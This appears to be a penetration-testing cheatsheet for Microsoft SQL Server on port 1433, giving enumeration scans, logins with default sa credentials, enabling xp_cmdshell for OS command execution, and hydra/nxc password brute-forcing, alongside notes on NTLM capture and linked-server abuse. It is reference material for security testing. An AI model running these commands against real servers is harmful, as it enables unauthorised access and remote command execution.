# MSSQL (1433)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

SQL Server. Check for `sa` account with blank/default password first. If `xp_cmdshell` is enabled (or you can enable it as sysadmin), you have OS command execution immediately. **Linked servers** chain into other databases or domains — a Kerberos-trust ladder by another name. UNC path injection captures NTLM hashes from the SQL service account. **Common attack vectors:** default/blank sa creds, xp_cmdshell OS execution, UNC path injection for NTLM capture, linked server abuse, SQL injection from app layer.

## Enumerate

```bash
nmap -sV -sC -p 1433 $IP
nmap --script ms-sql-info,ms-sql-ntlm-info -p 1433 $IP
nxc mssql $IP -u '' -p ''
```

## Connect

```bash
impacket-mssqlclient sa:'password'@$IP
impacket-mssqlclient domain/user:'pass'@$IP -windows-auth
sqsh -S $IP -U sa -P password
```

## Key queries

```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC sp_linkedservers;
```

## xp_cmdshell (if sysadmin)

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Brute-force

```bash
nxc mssql $IP -u sa -p passwords.txt
hydra -l sa -P passwords.txt mssql://$IP
```
